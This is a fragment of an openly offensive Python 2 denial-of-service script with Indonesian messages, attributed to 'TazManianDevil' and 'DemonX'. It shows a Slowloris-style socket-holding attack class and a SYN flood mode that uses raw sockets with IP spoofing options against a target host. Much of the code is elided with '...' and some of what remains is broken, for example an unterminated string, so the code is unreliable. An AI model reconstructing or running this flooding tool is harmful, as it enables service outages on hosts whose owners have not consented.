...
# Team     : TazManianDevil
# Post Date: 7/2/2020
# Mau Recode? izin Dulu Sama DemonX (087771653438) -> WhatsApp
version="1.18"
class color:
    HEADER = '\033[0m'
...
def check_tgt(args):
	...
	try:
		...
		sys.exit(cprint('[-]Host tidak ditemukan','yellow'))
	return ip
...
class slow:
	...
	def building_socket(self):
		try:
			...
			sys.exit(cprint('[-] Penyerangan dibatalkan','yellow'))
		return sock
	def sending_packets(self):
		try:
			...
			sys.exit(cprint('[-] Penyerangan dibatalkan','blue'))
		return sock
	def doconnection(self):
		...
		lsocks=[]
		lhandlers=[]
		cprint('\t\tMembuat, dan menutupi sockets','green')
		...
		while socks < int(self.threads):
			try:
				...
				break
				sys.exit(cprint('[-] Penyerangan dibatalkan .....','green'))
		print colored('We\'ve sent ','red') + colored(str(self.pkt_count),'cyan') + colored(' paket berhasil terkirim. Kita\'re jeda selama ','yellow') + colored(self.sleep,'red') + colored(' seconds','green')
...
'''
	...
	if args.syn:
		...
		if uid == 0:
			...
			sys.exit(cprint('[*] Hanya DemonX yang memiliki Akses,'red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print colored('[*] SYN dikirimkan: ','blue')+colored(tgt,'blue')
		while 1:
			if args.spoof == False:
				args.fakeip = True
				if args.fakeip == True:
		...
		tgt = args.target
		threads = []
		print colored('[*] Sedang mengirim paket ke: ','blue')+colored(tgt,'green')
		while 1:
			try:
